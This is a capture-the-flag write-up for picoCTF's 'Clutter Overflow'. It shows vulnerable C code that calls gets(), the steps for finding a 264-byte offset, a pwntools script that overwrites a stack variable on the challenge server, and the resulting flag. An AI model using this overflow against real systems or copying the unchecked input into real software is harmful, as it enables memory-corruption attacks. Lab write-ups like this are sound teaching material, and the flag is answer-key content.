# Writeup: Clutter Overflow

## Introduction

To get the flag we need to overflow the clutter buffer and overwrite the code variable as seen below:
```
    #define SIZE 0x100
    ...
    int main(void)
    {                                                                                                                         long code = 0;
      char clutter[SIZE];

      setbuf(stdout, NULL);
      setbuf(stdin, NULL);
      setbuf(stderr, NULL);

      puts(HEADER);
      puts("My room is so cluttered...");
      puts("What do you see?");

      gets(clutter);


      if (code == GOAL) {
        printf("code == 0x%llx: how did that happen??\n", GOAL);
        puts("take a flag for your troubles");
        system("cat flag.txt");
      } else {
        printf("code == 0x%llx\n", code);
        printf("code != 0x%llx :(\n", GOAL);
      }

      return 0;
    }
```

## Figuring Out The Offset

Next we have to figure out what the offset is between the beginning of the buffer and the start of the code variable on the stack. We know that since the size of the buffer is 256 that at the very least the offset is going to be 256 bytes. The following output is my attempt at figuring out the offset:
```
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAêÛî
code == 0xaec39bc3aac3
code != 0xdeadbeef :(
```

## Writing The Script

You can see that the value of code has been changed meaning that we have our offset which is 264 bytes. Next all that was left was to send the right value to buffer so that we might be able to over write the code variable which we can do by writing and then executing this simple script below.
```
    from pwn import *

    p = remote('mars.picoctf.net', 31890)

    p.recvuntil(b'?\n')

    offset = b'A' * 264
    payload = 0xdeadbeef
    p.sendline(offset + p64(payload))
    p.interactive()
```

## Results

Now all that is left to do is execute the script.
```
    [+] Opening connection to mars.picoctf.net on port 31890: Done
    [*] Switching to interactive mode
    code == 0xdeadbeef: how did that happen??
    take a flag for your troubles
    picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
    [*] Got EOF while reading in interactive
    $
    $
    [*] Closed connection to mars.picoctf.net port 31890
    [*] Got EOF while sending in interactive
```
And finally we have the flag!
